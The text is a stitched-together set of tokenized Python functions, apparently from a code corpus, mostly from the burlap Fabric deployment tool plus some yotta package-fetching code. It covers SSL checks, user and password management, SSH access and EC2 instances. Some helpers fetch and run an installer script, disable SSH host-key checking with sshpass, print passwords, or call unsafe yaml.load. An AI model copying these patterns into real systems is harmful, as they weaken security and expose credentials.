def _getTarball ( url , into_directory , cache_key , origin_info = None ) : try : access_common . unpackFromCache ( cache_key , into_directory ) except KeyError as e : tok = settings . getProperty ( 'github' , 'authtoken' ) headers = { } if tok is not None : headers [ 'Authorization' ] = 'token ' + str ( tok ) logger . debug ( 'GET %s' , url ) response = requests . get ( url , allow_redirects = True , stream = True , headers = headers ) response . raise_for_status ( ) logger . debug ( 'getting file: %s' , url ) logger . debug ( 'headers: %s' , response . headers ) response . raise_for_status ( ) # github doesn't exposes hashes of the archives being downloaded as far # as I can tell :( access_common . unpackTarballStream ( stream = response , into_directory = into_directory , hash = { } , cache_key = cache_key , origin_info = origin_info )
def availableVersions ( self ) : r = [ ] for t in self . _getTags ( ) : logger . debug ( "available version tag: %s" , t ) # ignore empty tags: if not len ( t [ 0 ] . strip ( ) ) : continue try : r . append ( GithubComponentVersion ( t [ 0 ] , t [ 0 ] , url = t [ 1 ] , name = self . name , cache_key = None ) ) except ValueError : logger . debug ( 'invalid version tag: %s' , t ) return r
def availableTags ( self ) : return [ GithubComponentVersion ( '' , t [ 0 ] , t [ 1 ] , self . name , cache_key = _createCacheKey ( 'tag' , t [ 0 ] , t [ 1 ] , self . name ) ) for t in self . _getTags ( ) ]
def availableBranches ( self ) : return [ GithubComponentVersion ( '' , b [ 0 ] , b [ 1 ] , self . name , cache_key = None ) for b in _getBranchHeads ( self . repo ) . items ( ) ]
def commitVersion ( self ) : import re commit_match = re . match ( '^[a-f0-9]{7,40}$' , self . tagOrBranchSpec ( ) , re . I ) if commit_match : return GithubComponentVersion ( '' , '' , _getCommitArchiveURL ( self . repo , self . tagOrBranchSpec ( ) ) , self . name , cache_key = None ) return None
def _handleAuth ( fn ) : @ functools . wraps ( fn ) def wrapped ( * args , * * kwargs ) : # auth, , authenticate users, internal from yotta . lib import auth # if yotta is being run noninteractively, then we never retry, but we # do call auth.authorizeUser, so that a login URL can be displayed: interactive = globalconf . get ( 'interactive' ) try : return fn ( * args , * * kwargs ) except requests . exceptions . HTTPError as e : if e . response . status_code == requests . codes . unauthorized : #pylint: disable=no-member logger . debug ( '%s unauthorised' , fn ) # any provider is sufficient for registry auth auth . authorizeUser ( provider = None , interactive = interactive ) if interactive : logger . debug ( 'retrying after authentication...' ) return fn ( * args , * * kwargs ) raise return wrapped
def islast ( generator ) : next_x = None first = True for x in generator : if not first : yield ( next_x , False ) next_x = x first = False if not first : yield ( next_x , True )
def sourceDirValidationError ( dirname , component_name ) : if dirname == component_name : return 'Module %s public include directory %s should not contain source files' % ( component_name , dirname ) elif dirname . lower ( ) in ( 'source' , 'src' ) and dirname != 'source' : return 'Module %s has non-standard source directory name: "%s" should be "source"' % ( component_name , dirname ) elif isPotentialTestDir ( dirname ) and dirname != 'test' : return 'Module %s has non-standard test directory name: "%s" should be "test"' % ( component_name , dirname ) elif not Source_Dir_Regex . match ( dirname ) : corrected = Source_Dir_Invalid_Regex . sub ( '' , dirname . lower ( ) ) if not corrected : corrected = 'source' return 'Module %s has non-standard source directory name: "%s" should be "%s"' % ( component_name , dirname , corrected ) else : return None
def commitVersion ( self , spec ) : import re commit_match = re . match ( '^[a-f0-9]{7,40}$' , spec , re . I ) if commit_match : return GitCloneVersion ( '' , spec , self ) return None
def _loadConfig ( self ) : config_dicts = [ self . additional_config , self . app_config ] + [ t . getConfig ( ) for t in self . hierarchy ] # create an identical set of dictionaries, but with the names of the # sources in place of the values. When these are merged they will show # where each merged property came from: config_blame = [ _mirrorStructure ( self . additional_config , 'command-line config' ) , _mirrorStructure ( self . app_config , 'application\'s config.json' ) , ] + [ _mirrorStructure ( t . getConfig ( ) , t . getName ( ) ) for t in self . hierarchy ] self . config = _mergeDictionaries ( * config_dicts ) self . config_blame = _mergeDictionaries ( * config_blame )
def sometimesPruneCache ( p ) : def decorator ( fn ) : @ functools . wraps ( fn ) def wrapped ( * args , * * kwargs ) : r = fn ( * args , * * kwargs ) if random . random ( ) < p : pruneCache ( ) return r return wrapped return decorator
def get_expiration_date ( self , fn ) : r = self . local_renderer r . env . crt_fn = fn with hide ( 'running' ) : ret = r . local ( 'openssl x509 -noout -in {ssl_crt_fn} -dates' , capture = True ) matches = re . findall ( 'notAfter=(.*?)$' , ret , flags = re . IGNORECASE ) if matches : return dateutil . parser . parse ( matches [ 0 ] )
def list_expiration_dates ( self , base = 'roles/all/ssl' ) : max_fn_len = 0 max_date_len = 0 data = [ ] for fn in os . listdir ( base ) : fqfn = os . path . join ( base , fn ) if not os . path . isfile ( fqfn ) : continue if not fn . endswith ( '.crt' ) : continue expiration_date = self . get_expiration_date ( fqfn ) max_fn_len = max ( max_fn_len , len ( fn ) ) max_date_len = max ( max_date_len , len ( str ( expiration_date ) ) ) data . append ( ( fn , expiration_date ) ) print ( '%s %s %s' % ( 'Filename' . ljust ( max_fn_len ) , 'Expiration Date' . ljust ( max_date_len ) , 'Expired' ) ) now = datetime . now ( ) . replace ( tzinfo = pytz . UTC ) for fn , dt in sorted ( data ) : if dt is None : expired = '?' elif dt < now : expired = 'YES' else : expired = 'NO' print ( '%s %s %s' % ( fn . ljust ( max_fn_len ) , str ( dt ) . ljust ( max_date_len ) , expired ) )
def verify_certificate_chain ( self , base = None , crt = None , csr = None , key = None ) : from burlap . common import get_verbose , print_fail , print_success r = self . local_renderer if base : crt = base + '.crt' csr = base + '.csr' key = base + '.key' else : assert crt and csr and key , 'If base not provided, crt and csr and key must be given.' assert os . path . isfile ( crt ) assert os . path . isfile ( csr ) assert os . path . isfile ( key ) csr_md5 = r . local ( 'openssl req -noout -modulus -in %s | openssl md5' % csr , capture = True ) key_md5 = r . local ( 'openssl rsa -noout -modulus -in %s | openssl md5' % key , capture = True ) crt_md5 = r . local ( 'openssl x509 -noout -modulus -in %s | openssl md5' % crt , capture = True ) match = crt_md5 == csr_md5 == key_md5 if self . verbose or not match : print ( 'crt:' , crt_md5 ) print ( 'csr:' , csr_md5 ) print ( 'key:' , key_md5 ) if match : print_success ( 'Files look good!' ) else : print_fail ( 'Files no not match!' ) raise Exception ( 'Files no not match!' )
def _get_environ_handler ( name , d ) : def func ( site = None , * * kwargs ) : from fabric import state # We can't auto-set default_site, because that break tasks that have # to operate over multiple sites. # If a task requires a site, it can pull from default_site as needed. #site = site or d.get('default_site') or env.SITE BURLAP_SHELL_PREFIX = int ( os . environ . get ( 'BURLAP_SHELL_PREFIX' , '0' ) ) if BURLAP_SHELL_PREFIX : print ( '#!/bin/bash' ) print ( '# Generated with:' ) print ( '#' ) print ( '#     export BURLAP_SHELL_PREFIX=1; export BURLAP_COMMAND_PREFIX=0; fab %s' % ( ' ' . join ( sys . argv [ 1 : ] ) , ) ) print ( '#' ) BURLAP_COMMAND_PREFIX = int ( os . environ . get ( 'BURLAP_COMMAND_PREFIX' , '1' ) ) with_args = [ ] if not BURLAP_COMMAND_PREFIX : for k in state . output : state . output [ k ] = False hostname = kwargs . get ( 'hostname' ) hostname = hostname or kwargs . get ( 'name' ) hostname = hostname or kwargs . get ( 'hn' ) hostname = hostname or kwargs . get ( 'h' ) verbose = int ( kwargs . get ( 'verbose' , '0' ) ) common . set_verbose ( verbose ) # Load environment for current role. env . update ( env_default ) env [ common . ROLE ] = os . environ [ common . ROLE ] = name if site : env [ common . SITE ] = os . environ [ common . SITE ] = site env . update ( d ) # Load host retriever. retriever = None if env . hosts_retriever : # Dynamically retrieve hosts. #             module_name = '.'.join(env.hosts_retriever.split('.')[:-1]) #             func_name = env.hosts_retriever.split('.')[-1] #             retriever = getattr(importlib.import_module(module_name), func_name) retriever = common . get_hosts_retriever ( ) if verbose : print ( 'Using retriever:' , env . hosts_retriever , retriever ) # Load host translator. translator = None if hostname : # Filter hosts list by a specific host name. module_name = '.' . join ( env . hostname_translator . split ( '.' ) [ : - 1 ] ) func_name = env . hostname_translator . split ( '.' ) [ - 1 ] translator = getattr ( importlib . import_module ( module_name ) , func_name ) # Re-load environment for current role, incase loading # the retriever/translator reset some environment values. env . update ( env_default ) env [ common . ROLE ] = os . environ [ common . ROLE ] = name if site : env [ common . SITE ] = os . environ [ common . SITE ] = site env . update ( d ) # Dynamically retrieve hosts. if env . hosts_retriever : if verbose : print ( 'Building host list with retriever %s...' % env . hosts_retriever ) env . hosts = list ( retriever ( site = site ) ) if verbose : print ( 'Found hosts:' ) print ( env . hosts ) # Filter hosts list by a specific host name. if hostname : _hostname = hostname hostname = translator ( hostname = hostname ) _hosts = env . hosts env . hosts = [ _ for _ in env . hosts if _ == hostname ] assert env . hosts , 'Hostname %s does not match any known hosts.' % ( _hostname , ) if env . is_local is None : if env . hosts : env . is_local = 'localhost' in env . hosts or '127.0.0.1' in env . hosts elif env . host_string : env . is_local = 'localhost' in env . host_string or '127.0.0.1' in env . host_string for cb in common . post_role_load_callbacks : cb ( ) # Ensure satchels don't cache values from previously loaded roles. common . reset_all_satchels ( ) if env . hosts and not env . host_string : env . host_string = env . hosts [ 0 ] if verbose : print ( 'Loaded role %s.' % ( name , ) , file = sys . stderr ) func . __doc__ = 'Sets enivronment variables for the "%s" role.' % ( name , ) return func
def is_file ( self , path , use_sudo = False ) : if self . is_local and not use_sudo : return os . path . isfile ( path ) else : func = use_sudo and _sudo or _run with self . settings ( hide ( 'running' , 'warnings' ) , warn_only = True ) : return func ( '[ -f "%(path)s" ]' % locals ( ) ) . succeeded
def is_dir ( self , path , use_sudo = False ) : if self . is_local and not use_sudo : return os . path . isdir ( path ) else : func = use_sudo and _sudo or _run with self . settings ( hide ( 'running' , 'warnings' ) , warn_only = True ) : return func ( '[ -d "%(path)s" ]' % locals ( ) ) . succeeded
def is_link ( self , path , use_sudo = False ) : func = use_sudo and _sudo or _run with self . settings ( hide ( 'running' , 'warnings' ) , warn_only = True ) : return func ( '[ -L "%(path)s" ]' % locals ( ) ) . succeeded
def get_owner ( self , path , use_sudo = False ) : func = use_sudo and run_as_root or self . run # I'd prefer to use quiet=True, but that's not supported with older # versions of Fabric. with self . settings ( hide ( 'running' , 'stdout' ) , warn_only = True ) : result = func ( 'stat -c %%U "%(path)s"' % locals ( ) ) if result . failed and 'stat: illegal option' in result : # Try the BSD version of stat return func ( 'stat -f %%Su "%(path)s"' % locals ( ) ) return result
def md5sum ( self , filename , use_sudo = False ) : func = use_sudo and run_as_root or self . run with self . settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn_only = True ) : # Linux (LSB) if exists ( u'/usr/bin/md5sum' ) : res = func ( u'/usr/bin/md5sum %(filename)s' % locals ( ) ) # BSD / OS X elif exists ( u'/sbin/md5' ) : res = func ( u'/sbin/md5 -r %(filename)s' % locals ( ) ) # SmartOS Joyent build elif exists ( u'/opt/local/gnu/bin/md5sum' ) : res = func ( u'/opt/local/gnu/bin/md5sum %(filename)s' % locals ( ) ) # SmartOS Joyent build # (the former doesn't exist, at least on joyent_20130222T000747Z) elif exists ( u'/opt/local/bin/md5sum' ) : res = func ( u'/opt/local/bin/md5sum %(filename)s' % locals ( ) ) # Try to find ``md5sum`` or ``md5`` on ``$PATH`` or abort else : md5sum = func ( u'which md5sum' ) md5 = func ( u'which md5' ) if exists ( md5sum ) : res = func ( '%(md5sum)s %(filename)s' % locals ( ) ) elif exists ( md5 ) : res = func ( '%(md5)s %(filename)s' % locals ( ) ) else : abort ( 'No MD5 utility was found on this system.' ) if res . succeeded : _md5sum = res else : warn ( res ) _md5sum = None if isinstance ( _md5sum , six . string_types ) : _md5sum = _md5sum . strip ( ) . split ( '\n' ) [ - 1 ] . split ( ) [ 0 ] return _md5sum
def uncommented_lines ( self , filename , use_sudo = False ) : func = run_as_root if use_sudo else self . run res = func ( 'cat %s' % quote ( filename ) , quiet = True ) if res . succeeded : return [ line for line in res . splitlines ( ) if line and not line . startswith ( '#' ) ] return [ ]
def copy ( self , source , destination , recursive = False , use_sudo = False ) : func = use_sudo and run_as_root or self . run options = '-r ' if recursive else '' func ( '/bin/cp {0}{1} {2}' . format ( options , quote ( source ) , quote ( destination ) ) )
def move ( self , source , destination , use_sudo = False ) : func = use_sudo and run_as_root or self . run func ( '/bin/mv {0} {1}' . format ( quote ( source ) , quote ( destination ) ) )
def remove ( self , path , recursive = False , use_sudo = False ) : func = use_sudo and run_as_root or self . run options = '-r ' if recursive else '' func ( '/bin/rm {0}{1}' . format ( options , quote ( path ) ) )
def check_for_change ( self ) : r = self . local_renderer lm = self . last_manifest last_fingerprint = lm . fingerprint current_fingerprint = self . get_target_geckodriver_version_number ( ) self . vprint ( 'last_fingerprint:' , last_fingerprint ) self . vprint ( 'current_fingerprint:' , current_fingerprint ) if last_fingerprint != current_fingerprint : print ( 'A new release is available. %s' % self . get_most_recent_version ( ) ) return True print ( 'No updates found.' ) return False
def is_installed ( pkg_name ) : manager = MANAGER with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn_only = True ) : res = run ( "rpm --query %(pkg_name)s" % locals ( ) ) if res . succeeded : return True return False
def static ( self ) : fn = self . render_to_file ( 'ip/ip_interfaces_static.template' ) r = self . local_renderer r . put ( local_path = fn , remote_path = r . env . interfaces_fn , use_sudo = True )
def get_thumbprint ( self ) : extensions = self . extensions . split ( ' ' ) name_str = ' -or ' . join ( '-name "%s"' % ext for ext in extensions ) cmd = 'find ' + self . base_dir + r' -type f \( ' + name_str + r' \) -exec md5sum {} \; | sort -k 2 | md5sum' return getoutput ( cmd )
def get_thumbprint ( self ) : d = { } if self . names : names = self . names else : names = list ( self . satchel . lenv ) for name in self . names : d [ name ] = deepcopy ( self . satchel . env [ name ] ) return d
def get_thumbprint ( self ) : d = { } for tracker in self . trackers : d [ type ( tracker ) . __name__ ] = tracker . get_thumbprint ( ) return d
def upgrade ( safe = True ) : manager = MANAGER if safe : cmd = 'upgrade' else : cmd = 'dist-upgrade' run_as_root ( "%(manager)s --assume-yes %(cmd)s" % locals ( ) , pty = False )
def is_installed ( pkg_name ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn_only = True ) : res = run ( "dpkg -s %(pkg_name)s" % locals ( ) ) for line in res . splitlines ( ) : if line . startswith ( "Status: " ) : status = line [ 8 : ] if "installed" in status . split ( ' ' ) : return True return False
def apt_key_exists ( keyid ) : # Command extracted from apt-key source gpg_cmd = 'gpg --ignore-time-conflict --no-options --no-default-keyring --keyring /etc/apt/trusted.gpg' with settings ( hide ( 'everything' ) , warn_only = True ) : res = run ( '%(gpg_cmd)s --fingerprint %(keyid)s' % locals ( ) ) return res . succeeded
def exists ( self , name ) : with self . settings ( hide ( 'running' , 'stdout' , 'warnings' ) , warn_only = True ) : return self . run ( 'getent group %(name)s' % locals ( ) ) . succeeded
def enter_password_change ( self , username = None , old_password = None ) : from fabric . state import connections from fabric . network import disconnect_all r = self . local_renderer #         print('self.genv.user:', self.genv.user) #         print('self.env.passwords:', self.env.passwords) r . genv . user = r . genv . user or username r . pc ( 'Changing password for user {user} via interactive prompts.' ) r . env . old_password = r . env . default_passwords [ self . genv . user ] #         print('self.genv.user:', self.genv.user) #         print('self.env.passwords:', self.env.passwords) r . env . new_password = self . env . passwords [ self . genv . user ] if old_password : r . env . old_password = old_password prompts = { '(current) UNIX password: ' : r . env . old_password , 'Enter new UNIX password: ' : r . env . new_password , 'Retype new UNIX password: ' : r . env . new_password , #"Login password for '%s': " % r.genv.user: r.env.new_password, #             "Login password for '%s': " % r.genv.user: r.env.old_password, } print ( 'prompts:' , prompts ) r . env . password = r . env . old_password with self . settings ( warn_only = True ) : ret = r . _local ( "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{host_string} echo hello" , capture = True ) #code 1 = good password, but prompts needed #code 5 = bad password #code 6 = good password, but host public key is unknown if ret . return_code in ( 1 , 6 ) or 'hello' in ret : # Login succeeded, so we haven't yet changed the password, so use the default password. self . genv . password = r . env . old_password elif self . genv . user in self . genv . user_passwords : # Otherwise, use the password or key set in the config. self . genv . password = r . env . new_password else : # Default password fails and there's no current password, so clear. self . genv . password = None print ( 'using password:' , self . genv . password ) # Note, the correct current password should be set in host.initrole(), not here. #r.genv.password = r.env.new_password #r.genv.password = r.env.new_password with self . settings ( prompts = prompts ) : ret = r . _run ( 'echo checking for expired password' ) print ( 'ret:[%s]' % ret ) do_disconnect = 'passwd: password updated successfully' in ret print ( 'do_disconnect:' , do_disconnect ) if do_disconnect : # We need to disconnect to reset the session or else Linux will again prompt # us to change our password. disconnect_all ( ) # Further logins should require the new password. self . genv . password = r . env . new_password
def togroups ( self , user , groups ) : r = self . local_renderer if isinstance ( groups , six . string_types ) : groups = [ _ . strip ( ) for _ in groups . split ( ',' ) if _ . strip ( ) ] for group in groups : r . env . username = user r . env . group = group r . sudo ( 'groupadd --force {group}' ) r . sudo ( 'adduser {username} {group}' )
def generate_keys ( self , username , hostname ) : r = self . local_renderer #r.env.key_filename = r.env.key_filename or env.key_filename #assert r.env.key_filename, 'r.env.key_filename or env.key_filename must be set. e.g. roles/role/app_name-role.pem' r . env . key_filename = self . env . key_filename_template . format ( ROLE = self . genv . ROLE , host = hostname , username = username , ) if os . path . isfile ( r . env . key_filename ) : r . pc ( 'Key file {key_filename} already exists. Skipping generation.' . format ( * * r . env ) ) else : r . local ( "ssh-keygen -t {key_type} -b {key_bits} -f {key_filename} -N ''" ) r . local ( 'chmod {key_perms} {key_filename}' ) if r . env . key_filename . endswith ( '.pem' ) : src = r . env . key_filename + '.pub' dst = ( r . env . key_filename + '.pub' ) . replace ( '.pem' , '' ) #                 print('generate_keys:', src, dst) r . env . src = src r . env . dst = dst r . local ( 'mv {src} {dst}' ) return r . env . key_filename
def create ( self , username , groups = None , uid = None , create_home = None , system = False , password = None , home_dir = None ) : r = self . local_renderer r . env . username = username args = [ ] if uid : args . append ( '-u %s' % uid ) if create_home is None : create_home = not system if create_home is True : if home_dir : args . append ( '--home %s' % home_dir ) elif create_home is False : args . append ( '--no-create-home' ) if password is None : pass elif password : crypted_password = _crypt_password ( password ) args . append ( '-p %s' % quote ( crypted_password ) ) else : args . append ( '--disabled-password' ) args . append ( '--gecos ""' ) if system : args . append ( '--system' ) r . env . args = ' ' . join ( args ) r . env . groups = ( groups or '' ) . strip ( ) r . sudo ( 'adduser {args} {username} || true' ) if groups : for group in groups . split ( ' ' ) : group = group . strip ( ) if not group : continue r . sudo ( 'adduser %s %s || true' % ( username , group ) )
def expire_password ( self , username ) : r = self . local_renderer r . env . username = username r . sudo ( 'chage -d 0 {username}' )
def shell ( self , gui = 0 , command = '' , dryrun = None , shell_interactive_cmd_str = None ) : from burlap . common import get_hosts_for_site if dryrun is not None : self . dryrun = dryrun r = self . local_renderer if r . genv . SITE != r . genv . default_site : shell_hosts = get_hosts_for_site ( ) if shell_hosts : r . genv . host_string = shell_hosts [ 0 ] r . env . SITE = r . genv . SITE or r . genv . default_site if int ( gui ) : r . env . shell_default_options . append ( '-X' ) if 'host_string' not in self . genv or not self . genv . host_string : if 'available_sites' in self . genv and r . env . SITE not in r . genv . available_sites : raise Exception ( 'No host_string set. Unknown site %s.' % r . env . SITE ) else : raise Exception ( 'No host_string set.' ) if '@' in r . genv . host_string : r . env . shell_host_string = r . genv . host_string else : r . env . shell_host_string = '{user}@{host_string}' if command : r . env . shell_interactive_cmd_str = command else : r . env . shell_interactive_cmd_str = r . format ( shell_interactive_cmd_str or r . env . shell_interactive_cmd ) r . env . shell_default_options_str = ' ' . join ( r . env . shell_default_options ) if self . is_local : self . vprint ( 'Using direct local.' ) cmd = '{shell_interactive_cmd_str}' elif r . genv . key_filename : self . vprint ( 'Using key filename.' ) # If host_string contains the port, then strip it off and pass separately. port = r . env . shell_host_string . split ( ':' ) [ - 1 ] if port . isdigit ( ) : r . env . shell_host_string = r . env . shell_host_string . split ( ':' ) [ 0 ] + ( ' -p %s' % port ) cmd = 'ssh -t {shell_default_options_str} -i {key_filename} {shell_host_string} "{shell_interactive_cmd_str}"' elif r . genv . password : self . vprint ( 'Using password.' ) cmd = 'ssh -t {shell_default_options_str} {shell_host_string} "{shell_interactive_cmd_str}"' else : # No explicit password or key file needed? self . vprint ( 'Using nothing.' ) cmd = 'ssh -t {shell_default_options_str} {shell_host_string} "{shell_interactive_cmd_str}"' r . local ( cmd )
def disk ( self ) : r = self . local_renderer r . run ( r . env . disk_usage_command )
def tunnel ( self , local_port , remote_port ) : r = self . local_renderer r . env . tunnel_local_port = local_port r . env . tunnel_remote_port = remote_port r . local ( ' ssh -i {key_filename} -L {tunnel_local_port}:localhost:{tunnel_remote_port} {user}@{host_string} -N' )
def _install_from_scratch ( python_cmd , use_sudo ) : with cd ( "/tmp" ) : download ( EZ_SETUP_URL ) command = '%(python_cmd)s ez_setup.py' % locals ( ) if use_sudo : run_as_root ( command ) else : run ( command ) run ( 'rm -f ez_setup.py' )
def has_virtualenv ( self ) : with self . settings ( warn_only = True ) : ret = self . run_or_local ( 'which virtualenv' ) . strip ( ) return bool ( ret )
def virtualenv_exists ( self , virtualenv_dir = None ) : r = self . local_renderer ret = True with self . settings ( warn_only = True ) : ret = r . run_or_local ( 'ls {virtualenv_dir}' ) or '' ret = 'cannot access' not in ret . strip ( ) . lower ( ) if self . verbose : if ret : print ( 'Yes' ) else : print ( 'No' ) return ret
def what_requires ( self , name ) : r = self . local_renderer r . env . name = name r . local ( 'pipdeptree -p {name} --reverse' )
def init ( self ) : r = self . local_renderer #         if self.virtualenv_exists(): #             print('virtualenv exists') #             return print ( 'Creating new virtual environment...' ) with self . settings ( warn_only = True ) : cmd = '[ ! -d {virtualenv_dir} ] && virtualenv --no-site-packages {virtualenv_dir} || true' if self . is_local : r . run_or_local ( cmd ) else : r . sudo ( cmd )
def get_combined_requirements ( self , requirements = None ) : requirements = requirements or self . env . requirements def iter_lines ( fn ) : with open ( fn , 'r' ) as fin : for line in fin . readlines ( ) : line = line . strip ( ) if not line or line . startswith ( '#' ) : continue yield line content = [ ] if isinstance ( requirements , ( tuple , list ) ) : for f in requirements : f = self . find_template ( f ) content . extend ( list ( iter_lines ( f ) ) ) else : assert isinstance ( requirements , six . string_types ) f = self . find_template ( requirements ) content . extend ( list ( iter_lines ( f ) ) ) return '\n' . join ( content )
def list_instances ( show = 1 , name = None , group = None , release = None , except_release = None ) : from burlap . common import shelf , OrderedDict , get_verbose verbose = get_verbose ( ) require ( 'vm_type' , 'vm_group' ) assert env . vm_type , 'No VM type specified.' env . vm_type = ( env . vm_type or '' ) . lower ( ) _name = name _group = group _release = release if verbose : print ( 'name=%s, group=%s, release=%s' % ( _name , _group , _release ) ) env . vm_elastic_ip_mappings = shelf . get ( 'vm_elastic_ip_mappings' ) data = type ( env ) ( ) if env . vm_type == EC2 : if verbose : print ( 'Checking EC2...' ) for instance in get_all_running_ec2_instances ( ) : name = instance . tags . get ( env . vm_name_tag ) group = instance . tags . get ( env . vm_group_tag ) release = instance . tags . get ( env . vm_release_tag ) if env . vm_group and env . vm_group != group : if verbose : print ( ( 'Skipping instance %s because its group "%s" ' 'does not match env.vm_group "%s".' ) % ( instance . public_dns_name , group , env . vm_group ) ) continue if _group and group != _group : if verbose : print ( ( 'Skipping instance %s because its group "%s" ' 'does not match local group "%s".' ) % ( instance . public_dns_name , group , _group ) ) continue if _name and name != _name : if verbose : print ( ( 'Skipping instance %s because its name "%s" ' 'does not match name "%s".' ) % ( instance . public_dns_name , name , _name ) ) continue if _release and release != _release : if verbose : print ( ( 'Skipping instance %s because its release "%s" ' 'does not match release "%s".' ) % ( instance . public_dns_name , release , _release ) ) continue if except_release and release == except_release : continue if verbose : print ( 'Adding instance %s (%s).' % ( name , instance . public_dns_name ) ) data . setdefault ( name , type ( env ) ( ) ) data [ name ] [ 'id' ] = instance . id data [ name ] [ 'public_dns_name' ] = instance . public_dns_name if verbose : print ( 'Public DNS: %s' % instance . public_dns_name ) if env . vm_elastic_ip_mappings and name in env . vm_elastic_ip_mappings : data [ name ] [ 'ip' ] = env . vm_elastic_ip_mappings [ name ] else : data [ name ] [ 'ip' ] = socket . gethostbyname ( instance . public_dns_name ) if int ( show ) : pprint ( data , indent = 4 ) return data elif env . vm_type == KVM : #virsh list pass else : raise NotImplementedError
def get_or_create_ec2_security_groups ( names = None , verbose = 1 ) : verbose = int ( verbose ) if verbose : print ( 'Creating EC2 security groups...' ) conn = get_ec2_connection ( ) if isinstance ( names , six . string_types ) : names = names . split ( ',' ) names = names or env . vm_ec2_selected_security_groups if verbose : print ( 'Group names:' , names ) ret = [ ] for name in names : try : group_id = get_ec2_security_group_id ( name ) if verbose : print ( 'group_id:' , group_id ) #group = conn.get_all_security_groups(groupnames=[name])[0] # Note, groups in a VPC can't be referred to by name? group = conn . get_all_security_groups ( group_ids = [ group_id ] ) [ 0 ] except boto . exception . EC2ResponseError as e : if verbose : print ( e ) group = get_ec2_connection ( ) . create_security_group ( name , name , vpc_id = env . vm_ec2_vpc_id , ) print ( 'group_id:' , group . id ) set_ec2_security_group_id ( name , group . id ) ret . append ( group ) # Find existing rules. actual_sets = set ( ) for rule in list ( group . rules ) : ip_protocol = rule . ip_protocol from_port = rule . from_port to_port = rule . to_port for cidr_ip in rule . grants : #print('Revoking:', ip_protocol, from_port, to_port, cidr_ip) #group.revoke(ip_protocol, from_port, to_port, cidr_ip) rule_groups = ( ( rule . groups and rule . groups . split ( ',' ) ) or [ None ] ) for src_group in rule_groups : src_group = ( src_group or '' ) . strip ( ) if src_group : actual_sets . add ( ( ip_protocol , from_port , to_port , str ( cidr_ip ) , src_group ) ) else : actual_sets . add ( ( ip_protocol , from_port , to_port , str ( cidr_ip ) ) ) # Find actual rules. expected_sets = set ( ) for authorization in env . vm_ec2_available_security_groups . get ( name , [ ] ) : if verbose : print ( 'authorization:' , authorization ) if len ( authorization ) == 4 or ( len ( authorization ) == 5 and not ( authorization [ - 1 ] or '' ) . strip ( ) ) : src_group = None ip_protocol , from_port , to_port , cidr_ip = authorization [ : 4 ] if cidr_ip : expected_sets . add ( ( ip_protocol , str ( from_port ) , str ( to_port ) , cidr_ip ) ) else : ip_protocol , from_port , to_port , cidr_ip , src_group = authorization if cidr_ip : expected_sets . add ( ( ip_protocol , str ( from_port ) , str ( to_port ) , cidr_ip , src_group ) ) # Calculate differences and update rules if we own the group. if env . vm_ec2_security_group_owner : if verbose : print ( 'expected_sets:' ) print ( expected_sets ) print ( 'actual_sets:' ) print ( actual_sets ) del_sets = actual_sets . difference ( expected_sets ) if verbose : print ( 'del_sets:' ) print ( del_sets ) add_sets = expected_sets . difference ( actual_sets ) if verbose : print ( 'add_sets:' ) print ( add_sets ) # Revoke deleted. for auth in del_sets : print ( len ( auth ) ) print ( 'revoking:' , auth ) group . revoke ( * auth ) # Create fresh rules. for auth in add_sets : print ( 'authorizing:' , auth ) group . authorize ( * auth ) return ret
def get_or_create_ec2_key_pair ( name = None , verbose = 1 ) : verbose = int ( verbose ) name = name or env . vm_ec2_keypair_name pem_path = 'roles/%s/%s.pem' % ( env . ROLE , name ) conn = get_ec2_connection ( ) kp = conn . get_key_pair ( name ) if kp : print ( 'Key pair %s already exists.' % name ) else : # Note, we only get the private key during creation. # If we don't save it here, it's lost forever. kp = conn . create_key_pair ( name ) open ( pem_path , 'wb' ) . write ( kp . material ) os . system ( 'chmod 600 %s' % pem_path ) print ( 'Key pair %s created.' % name ) #return kp return pem_path
def exists ( name = None , group = None , release = None , except_release = None , verbose = 1 ) : verbose = int ( verbose ) instances = list_instances ( name = name , group = group , release = release , except_release = except_release , verbose = verbose , show = verbose ) ret = bool ( instances ) if verbose : print ( '\ninstance %s exist' % ( 'DOES' if ret else 'does NOT' ) ) #return ret return instances
def get_or_create ( name = None , group = None , config = None , extra = 0 , verbose = 0 , backend_opts = None ) : require ( 'vm_type' , 'vm_group' ) backend_opts = backend_opts or { } verbose = int ( verbose ) extra = int ( extra ) if config : config_fn = common . find_template ( config ) config = yaml . load ( open ( config_fn ) ) env . update ( config ) env . vm_type = ( env . vm_type or '' ) . lower ( ) assert env . vm_type , 'No VM type specified.' group = group or env . vm_group assert group , 'No VM group specified.' ret = exists ( name = name , group = group ) if not extra and ret : if verbose : print ( 'VM %s:%s exists.' % ( name , group ) ) return ret today = datetime . date . today ( ) release = int ( '%i%02i%02i' % ( today . year , today . month , today . day ) ) if not name : existing_instances = list_instances ( group = group , release = release , verbose = verbose ) name = env . vm_name_template . format ( index = len ( existing_instances ) + 1 ) if env . vm_type == EC2 : return get_or_create_ec2_instance ( name = name , group = group , release = release , verbose = verbose , backend_opts = backend_opts ) else : raise NotImplementedError
def delete ( name = None , group = None , release = None , except_release = None , dryrun = 1 , verbose = 1 ) : verbose = int ( verbose ) if env . vm_type == EC2 : conn = get_ec2_connection ( ) instances = list_instances ( name = name , group = group , release = release , except_release = except_release , ) for instance_name , instance_data in instances . items ( ) : public_dns_name = instance_data [ 'public_dns_name' ] print ( '\nDeleting %s (%s)...' % ( instance_name , instance_data [ 'id' ] ) ) if not get_dryrun ( ) : conn . terminate_instances ( instance_ids = [ instance_data [ 'id' ] ] ) # Clear host key on localhost. known_hosts = os . path . expanduser ( '~/.ssh/known_hosts' ) cmd = 'ssh-keygen -f "%s" -R %s' % ( known_hosts , public_dns_name ) local_or_dryrun ( cmd ) else : raise NotImplementedError
def get_name ( ) : if env . vm_type == EC2 : for instance in get_all_running_ec2_instances ( ) : if env . host_string == instance . public_dns_name : name = instance . tags . get ( env . vm_name_tag ) return name else : raise NotImplementedError
def respawn ( name = None , group = None ) : if name is None : name = get_name ( ) delete ( name = name , group = group ) instance = get_or_create ( name = name , group = group ) env . host_string = instance . public_dns_name
